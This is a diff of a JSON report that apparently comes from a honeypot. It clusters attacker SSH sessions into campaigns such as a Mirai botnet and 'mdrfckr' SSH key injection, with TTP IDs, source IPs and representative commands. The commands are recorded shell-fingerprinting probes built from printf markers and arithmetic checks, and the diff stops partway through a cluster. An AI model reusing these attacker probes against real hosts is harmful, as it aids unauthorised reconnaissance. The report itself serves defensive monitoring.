@@ -1,37 +1,48 @@
 {
-  "generated_at": "2026-11-17T20:12:06.488369+00:00",
-  "total_sessions_with_commands": 88,
-  "total_clusters": 51,
-  "campaign_clusters": 2,
-  "singleton_clusters": 46,
+  "generated_at": "2026-11-18T04:59:52.172199+00:00",
+  "total_sessions_with_commands": 36,
+  "total_clusters": 24,
+  "campaign_clusters": 3,
+  "singleton_clusters": 19,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
-      "cluster_id": "CLU-044",
+      "cluster_id": "CLU-016",
       "name": "Mirai/IoT Botnet",
       "severity": "HIGH",
       "session_count": 1,
       "unique_ip_count": 1,
       "ttps": [
-        "T1059.004",
-        "T1082",
-        "T1592",
+        "T1105",
+        "T1083",
         "T1140",
-        "T1105"
+        "T1059.004"
       ]
     },
     {
-      "cluster_id": "CLU-048",
+      "cluster_id": "CLU-019",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 49,
-      "unique_ip_count": 28,
+      "session_count": 17,
+      "unique_ip_count": 10,
       "ttps": [
         "T1021.004",
         "T1078",
         "T1070",
         "T1140",
         "T1105"
+      ]
+    },
+    {
+      "cluster_id": "CLU-021",
+      "name": "Mirai/IoT Botnet",
+      "severity": "HIGH",
+      "session_count": 1,
+      "unique_ip_count": 1,
+      "ttps": [
+        "T1105",
+        "T1140",
+        "T1059.004"
       ]
     }
   ],
@@ -45,31 +56,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.64"
+        "92.118.39.77"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "7450e1b8e37a1992",
+      "sequence_hash": "a156852cf875bf68",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_09f22c61fb28b91642df070d0b54611b_small_control'\"'\"' '\"'\"'check_09f22c61fb28b91642df070d0b54611b'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_09f22c61fb28b91642df070d0b54611b_small_control' 'check_09f22c61fb28b91642df070d0b54611b'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_09f22c61fb28b91642df070d0b54611b_small_math'\"'\"' \"$((553*461+25))\"'",
-        "(553*461+25",
-        "printf '\\n%s|%s\\n' 'check_09f22c61fb28b91642df070d0b54611b_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_09f22c61fb28b91642df070d0b54611b_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_09f22c61fb28b91642df070d0b54611b_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_09f22c61fb28b91642df070d0b54611b_arg1'\"'\"' '\"'\"'check_09f22c61fb28b91642df070d0b54611b_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_09f22c61fb28b91642df070d0b54611b_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_09f22c61fb28b91642df070d0b54611b_arg1' 'check_09f22c61fb28b91642df070d0b54611b_arg2'; printf '\\n%s|%s\\n' 'check_09f22c61fb28b91642df070d0b54611b_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_09f22c61fb28b91642df070d0b54611b() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_09f22c61fb28b91642df070d0b54611b_small_function'\"'\"' \"$1|$#\"; }; f_check_09f22c61fb28b91642df070d0b54611b '\"'\"'check_09f22c61fb28b91642df070d0b54611b_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_control'\"'\"' '\"'\"'check_6c3779f8324deb7c04c8eeac6bc2ad5f'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_control' 'check_6c3779f8324deb7c04c8eeac6bc2ad5f'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_math'\"'\"' \"$((785*504+59))\"'",
+        "(785*504+59",
+        "printf '\\n%s|%s\\n' 'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_6c3779f8324deb7c04c8eeac6bc2ad5f_arg1'\"'\"' '\"'\"'check_6c3779f8324deb7c04c8eeac6bc2ad5f_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_6c3779f8324deb7c04c8eeac6bc2ad5f_arg1' 'check_6c3779f8324deb7c04c8eeac6bc2ad5f_arg2'; printf '\\n%s|%s\\n' 'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_6c3779f8324deb7c04c8eeac6bc2ad5f() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_function'\"'\"' \"$1|$#\"; }; f_check_6c3779f8324deb7c04c8eeac6bc2ad5f '\"'\"'check_6c3779f8324deb7c04c8eeac6bc2ad5f_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-08c42347cc6d",
-          "src_ip": "92.118.39.64",
+          "session_id": "IR-bf03ecc613c0",
+          "src_ip": "92.118.39.77",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T10:17:13.344245Z"
+          "timestamp": "2026-11-18T01:10:42.012784Z"
         }
       ]
     },
@@ -82,31 +93,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.77"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "292fbb14d3d0a116",
+      "sequence_hash": "4698b9d1d81c1403",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8e2018c38fcf10c156dcba34124112b0_small_control'\"'\"' '\"'\"'check_8e2018c38fcf10c156dcba34124112b0'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_8e2018c38fcf10c156dcba34124112b0_small_control' 'check_8e2018c38fcf10c156dcba34124112b0'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8e2018c38fcf10c156dcba34124112b0_small_math'\"'\"' \"$((493*394+10))\"'",
-        "(493*394+10",
-        "printf '\\n%s|%s\\n' 'check_8e2018c38fcf10c156dcba34124112b0_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8e2018c38fcf10c156dcba34124112b0_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_8e2018c38fcf10c156dcba34124112b0_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_8e2018c38fcf10c156dcba34124112b0_arg1'\"'\"' '\"'\"'check_8e2018c38fcf10c156dcba34124112b0_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8e2018c38fcf10c156dcba34124112b0_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_8e2018c38fcf10c156dcba34124112b0_arg1' 'check_8e2018c38fcf10c156dcba34124112b0_arg2'; printf '\\n%s|%s\\n' 'check_8e2018c38fcf10c156dcba34124112b0_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_8e2018c38fcf10c156dcba34124112b0() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8e2018c38fcf10c156dcba34124112b0_small_function'\"'\"' \"$1|$#\"; }; f_check_8e2018c38fcf10c156dcba34124112b0 '\"'\"'check_8e2018c38fcf10c156dcba34124112b0_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_eccfd2b37bbd866f72a913021df3e183_small_control'\"'\"' '\"'\"'check_eccfd2b37bbd866f72a913021df3e183'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_eccfd2b37bbd866f72a913021df3e183_small_control' 'check_eccfd2b37bbd866f72a913021df3e183'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_eccfd2b37bbd866f72a913021df3e183_small_math'\"'\"' \"$((804*426+96))\"'",
+        "(804*426+96",
+        "printf '\\n%s|%s\\n' 'check_eccfd2b37bbd866f72a913021df3e183_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_eccfd2b37bbd866f72a913021df3e183_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_eccfd2b37bbd866f72a913021df3e183_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_eccfd2b37bbd866f72a913021df3e183_arg1'\"'\"' '\"'\"'check_eccfd2b37bbd866f72a913021df3e183_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_eccfd2b37bbd866f72a913021df3e183_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_eccfd2b37bbd866f72a913021df3e183_arg1' 'check_eccfd2b37bbd866f72a913021df3e183_arg2'; printf '\\n%s|%s\\n' 'check_eccfd2b37bbd866f72a913021df3e183_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_eccfd2b37bbd866f72a913021df3e183() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_eccfd2b37bbd866f72a913021df3e183_small_function'\"'\"' \"$1|$#\"; }; f_check_eccfd2b37bbd866f72a913021df3e183 '\"'\"'check_eccfd2b37bbd866f72a913021df3e183_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-eadbbe655242",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-695f9bbf6f27",
+          "src_ip": "92.118.39.77",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:34:07.327044Z"
+          "timestamp": "2026-11-18T01:12:53.950594Z"
         }
       ]
     },
@@ -119,31 +130,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.77"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "3b1f063b8fac6b65",
+      "sequence_hash": "7a616c933a6e04f4",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_c81c22e581b07499bb60d21d276f8d0b_small_control'\"'\"' '\"'\"'check_c81c22e581b07499bb60d21d276f8d0b'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_c81c22e581b07499bb60d21d276f8d0b_small_control' 'check_c81c22e581b07499bb60d21d276f8d0b'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_c81c22e581b07499bb60d21d276f8d0b_small_math'\"'\"' \"$((382*15+13))\"'",
-        "(382*15+13",
-        "printf '\\n%s|%s\\n' 'check_c81c22e581b07499bb60d21d276f8d0b_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_c81c22e581b07499bb60d21d276f8d0b_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_c81c22e581b07499bb60d21d276f8d0b_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_c81c22e581b07499bb60d21d276f8d0b_arg1'\"'\"' '\"'\"'check_c81c22e581b07499bb60d21d276f8d0b_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_c81c22e581b07499bb60d21d276f8d0b_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_c81c22e581b07499bb60d21d276f8d0b_arg1' 'check_c81c22e581b07499bb60d21d276f8d0b_arg2'; printf '\\n%s|%s\\n' 'check_c81c22e581b07499bb60d21d276f8d0b_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_c81c22e581b07499bb60d21d276f8d0b() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_c81c22e581b07499bb60d21d276f8d0b_small_function'\"'\"' \"$1|$#\"; }; f_check_c81c22e581b07499bb60d21d276f8d0b '\"'\"'check_c81c22e581b07499bb60d21d276f8d0b_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_398b950c204ce576370a6f066d754ba3_small_control'\"'\"' '\"'\"'check_398b950c204ce576370a6f066d754ba3'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_398b950c204ce576370a6f066d754ba3_small_control' 'check_398b950c204ce576370a6f066d754ba3'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_398b950c204ce576370a6f066d754ba3_small_math'\"'\"' \"$((774*499+85))\"'",
+        "(774*499+85",
+        "printf '\\n%s|%s\\n' 'check_398b950c204ce576370a6f066d754ba3_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_398b950c204ce576370a6f066d754ba3_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_398b950c204ce576370a6f066d754ba3_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_398b950c204ce576370a6f066d754ba3_arg1'\"'\"' '\"'\"'check_398b950c204ce576370a6f066d754ba3_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_398b950c204ce576370a6f066d754ba3_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_398b950c204ce576370a6f066d754ba3_arg1' 'check_398b950c204ce576370a6f066d754ba3_arg2'; printf '\\n%s|%s\\n' 'check_398b950c204ce576370a6f066d754ba3_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_398b950c204ce576370a6f066d754ba3() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_398b950c204ce576370a6f066d754ba3_small_function'\"'\"' \"$1|$#\"; }; f_check_398b950c204ce576370a6f066d754ba3 '\"'\"'check_398b950c204ce576370a6f066d754ba3_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-ef8fcc73aceb",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-7935e929a588",
+          "src_ip": "92.118.39.77",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:36:08.938895Z"
+          "timestamp": "2026-11-18T01:15:11.007250Z"
         }
       ]
     },
@@ -156,31 +167,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.77"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "d8345ae2a2840053",
+      "sequence_hash": "937b20f52eb68b83",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4b9ce1bc96f7b96a7adfea54567b55fb_small_control'\"'\"' '\"'\"'check_4b9ce1bc96f7b96a7adfea54567b55fb'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_4b9ce1bc96f7b96a7adfea54567b55fb_small_control' 'check_4b9ce1bc96f7b96a7adfea54567b55fb'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4b9ce1bc96f7b96a7adfea54567b55fb_small_math'\"'\"' \"$((414*311+54))\"'",
-        "(414*311+54",
-        "printf '\\n%s|%s\\n' 'check_4b9ce1bc96f7b96a7adfea54567b55fb_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4b9ce1bc96f7b96a7adfea54567b55fb_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_4b9ce1bc96f7b96a7adfea54567b55fb_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_4b9ce1bc96f7b96a7adfea54567b55fb_arg1'\"'\"' '\"'\"'check_4b9ce1bc96f7b96a7adfea54567b55fb_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4b9ce1bc96f7b96a7adfea54567b55fb_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_4b9ce1bc96f7b96a7adfea54567b55fb_arg1' 'check_4b9ce1bc96f7b96a7adfea54567b55fb_arg2'; printf '\\n%s|%s\\n' 'check_4b9ce1bc96f7b96a7adfea54567b55fb_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_4b9ce1bc96f7b96a7adfea54567b55fb() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4b9ce1bc96f7b96a7adfea54567b55fb_small_function'\"'\"' \"$1|$#\"; }; f_check_4b9ce1bc96f7b96a7adfea54567b55fb '\"'\"'check_4b9ce1bc96f7b96a7adfea54567b55fb_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_306867ca60a61f945aca7dd204b46174_small_control'\"'\"' '\"'\"'check_306867ca60a61f945aca7dd204b46174'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_306867ca60a61f945aca7dd204b46174_small_control' 'check_306867ca60a61f945aca7dd204b46174'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_306867ca60a61f945aca7dd204b46174_small_math'\"'\"' \"$((429*805+74))\"'",
+        "(429*805+74",
+        "printf '\\n%s|%s\\n' 'check_306867ca60a61f945aca7dd204b46174_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_306867ca60a61f945aca7dd204b46174_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_306867ca60a61f945aca7dd204b46174_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_306867ca60a61f945aca7dd204b46174_arg1'\"'\"' '\"'\"'check_306867ca60a61f945aca7dd204b46174_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_306867ca60a61f945aca7dd204b46174_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_306867ca60a61f945aca7dd204b46174_arg1' 'check_306867ca60a61f945aca7dd204b46174_arg2'; printf '\\n%s|%s\\n' 'check_306867ca60a61f945aca7dd204b46174_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_306867ca60a61f945aca7dd204b46174() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_306867ca60a61f945aca7dd204b46174_small_function'\"'\"' \"$1|$#\"; }; f_check_306867ca60a61f945aca7dd204b46174 '\"'\"'check_306867ca60a61f945aca7dd204b46174_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-de87bb09b157",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-c346091af8dd",
+          "src_ip": "92.118.39.77",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:38:11.435678Z"
+          "timestamp": "2026-11-18T01:20:18.739931Z"
         }
       ]
     },
@@ -193,31 +204,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.77"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "3f3ffe2f2bade9b8",
+      "sequence_hash": "7917c93ba34a8b77",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_589c0e1b7321a5837dfc4d8f58b00250_small_control'\"'\"' '\"'\"'check_589c0e1b7321a5837dfc4d8f58b00250'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_589c0e1b7321a5837dfc4d8f58b00250_small_control' 'check_589c0e1b7321a5837dfc4d8f58b00250'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_589c0e1b7321a5837dfc4d8f58b00250_small_math'\"'\"' \"$((751*639+84))\"'",
-        "(751*639+84",
-        "printf '\\n%s|%s\\n' 'check_589c0e1b7321a5837dfc4d8f58b00250_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_589c0e1b7321a5837dfc4d8f58b00250_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_589c0e1b7321a5837dfc4d8f58b00250_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_589c0e1b7321a5837dfc4d8f58b00250_arg1'\"'\"' '\"'\"'check_589c0e1b7321a5837dfc4d8f58b00250_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_589c0e1b7321a5837dfc4d8f58b00250_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_589c0e1b7321a5837dfc4d8f58b00250_arg1' 'check_589c0e1b7321a5837dfc4d8f58b00250_arg2'; printf '\\n%s|%s\\n' 'check_589c0e1b7321a5837dfc4d8f58b00250_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_589c0e1b7321a5837dfc4d8f58b00250() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_589c0e1b7321a5837dfc4d8f58b00250_small_function'\"'\"' \"$1|$#\"; }; f_check_589c0e1b7321a5837dfc4d8f58b00250 '\"'\"'check_589c0e1b7321a5837dfc4d8f58b00250_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_71e63a5229758b6bd38fa149cd4b90d2_small_control'\"'\"' '\"'\"'check_71e63a5229758b6bd38fa149cd4b90d2'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_71e63a5229758b6bd38fa149cd4b90d2_small_control' 'check_71e63a5229758b6bd38fa149cd4b90d2'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_71e63a5229758b6bd38fa149cd4b90d2_small_math'\"'\"' \"$((246*66+59))\"'",
+        "(246*66+59",
+        "printf '\\n%s|%s\\n' 'check_71e63a5229758b6bd38fa149cd4b90d2_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_71e63a5229758b6bd38fa149cd4b90d2_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_71e63a5229758b6bd38fa149cd4b90d2_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_71e63a5229758b6bd38fa149cd4b90d2_arg1'\"'\"' '\"'\"'check_71e63a5229758b6bd38fa149cd4b90d2_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_71e63a5229758b6bd38fa149cd4b90d2_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_71e63a5229758b6bd38fa149cd4b90d2_arg1' 'check_71e63a5229758b6bd38fa149cd4b90d2_arg2'; printf '\\n%s|%s\\n' 'check_71e63a5229758b6bd38fa149cd4b90d2_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_71e63a5229758b6bd38fa149cd4b90d2() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_71e63a5229758b6bd38fa149cd4b90d2_small_function'\"'\"' \"$1|$#\"; }; f_check_71e63a5229758b6bd38fa149cd4b90d2 '\"'\"'check_71e63a5229758b6bd38fa149cd4b90d2_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-8bb0fa0aad1e",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-f84802733288",
+          "src_ip": "92.118.39.77",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:40:18.409050Z"
+          "timestamp": "2026-11-18T01:22:36.850149Z"
         }
       ]
     },
@@ -230,31 +241,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.77"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "006d559e0884a47f",
+      "sequence_hash": "edbb1a34fc950aca",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_267af7ef1794b47df367155e77bcd696_small_control'\"'\"' '\"'\"'check_267af7ef1794b47df367155e77bcd696'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_267af7ef1794b47df367155e77bcd696_small_control' 'check_267af7ef1794b47df367155e77bcd696'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_267af7ef1794b47df367155e77bcd696_small_math'\"'\"' \"$((878*48+54))\"'",
-        "(878*48+54",
-        "printf '\\n%s|%s\\n' 'check_267af7ef1794b47df367155e77bcd696_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_267af7ef1794b47df367155e77bcd696_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_267af7ef1794b47df367155e77bcd696_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_267af7ef1794b47df367155e77bcd696_arg1'\"'\"' '\"'\"'check_267af7ef1794b47df367155e77bcd696_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_267af7ef1794b47df367155e77bcd696_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_267af7ef1794b47df367155e77bcd696_arg1' 'check_267af7ef1794b47df367155e77bcd696_arg2'; printf '\\n%s|%s\\n' 'check_267af7ef1794b47df367155e77bcd696_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_267af7ef1794b47df367155e77bcd696() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_267af7ef1794b47df367155e77bcd696_small_function'\"'\"' \"$1|$#\"; }; f_check_267af7ef1794b47df367155e77bcd696 '\"'\"'check_267af7ef1794b47df367155e77bcd696_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b078b7af9d6ebf6e1ef5458e39bac065_small_control'\"'\"' '\"'\"'check_b078b7af9d6ebf6e1ef5458e39bac065'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_b078b7af9d6ebf6e1ef5458e39bac065_small_control' 'check_b078b7af9d6ebf6e1ef5458e39bac065'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b078b7af9d6ebf6e1ef5458e39bac065_small_math'\"'\"' \"$((312*447+72))\"'",
+        "(312*447+72",
+        "printf '\\n%s|%s\\n' 'check_b078b7af9d6ebf6e1ef5458e39bac065_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b078b7af9d6ebf6e1ef5458e39bac065_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_b078b7af9d6ebf6e1ef5458e39bac065_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_b078b7af9d6ebf6e1ef5458e39bac065_arg1'\"'\"' '\"'\"'check_b078b7af9d6ebf6e1ef5458e39bac065_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b078b7af9d6ebf6e1ef5458e39bac065_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_b078b7af9d6ebf6e1ef5458e39bac065_arg1' 'check_b078b7af9d6ebf6e1ef5458e39bac065_arg2'; printf '\\n%s|%s\\n' 'check_b078b7af9d6ebf6e1ef5458e39bac065_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_b078b7af9d6ebf6e1ef5458e39bac065() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b078b7af9d6ebf6e1ef5458e39bac065_small_function'\"'\"' \"$1|$#\"; }; f_check_b078b7af9d6ebf6e1ef5458e39bac065 '\"'\"'check_b078b7af9d6ebf6e1ef5458e39bac065_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-a8f0e773251a",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-3d2b4e269a89",
+          "src_ip": "92.118.39.77",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:42:23.154399Z"
+          "timestamp": "2026-11-18T01:24:53.916543Z"
         }
       ]
     },
@@ -267,31 +278,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.77"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "8f5327b666df6064",
+      "sequence_hash": "17231a19ed213b4f",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_cb4fb270e84a19b30a6b089ba67748d9_small_control'\"'\"' '\"'\"'check_cb4fb270e84a19b30a6b089ba67748d9'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_cb4fb270e84a19b30a6b089ba67748d9_small_control' 'check_cb4fb270e84a19b30a6b089ba67748d9'",
